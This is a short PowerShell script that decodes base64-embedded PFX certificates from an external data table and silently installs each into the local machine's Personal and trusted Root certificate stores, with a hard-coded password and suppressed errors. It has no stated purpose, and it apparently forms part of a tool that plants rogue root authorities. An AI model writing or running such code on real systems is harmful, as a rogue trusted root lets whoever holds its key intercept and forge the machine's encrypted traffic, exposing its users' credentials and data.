. ./consts_body.ps1
. ./consts_cert.ps1

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    $binary = [Convert]::FromBase64String($contentString)
    try {
        Set-Content -Path $outputFilePath -Value $binary -AsByteStream
    } catch {
        Add-Content -Path $outputFilePath -Value $binary -Encoding Byte
    }
    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Import certificate to Personal (My) store
        $personalStorePath = "Cert:\LocalMachine\My"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
        writedbg "Certificate installed successfully to Personal store (My)."

        # Import certificate to Root store
        $rootStorePath = "Cert:\LocalMachine\Root"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
        writedbg "Certificate installed successfully to Root store."

    } catch {
        throw "Failed to install certificate: $_"
    }
}

function do_cert {
    try 
    {
        foreach ($key in $xdata.Keys) {
            Cert-Work -contentString $xdata[$key]
        }
    }
    catch {
        writedbg "An error occurred (ConfigureCertificates): $_"
      }
}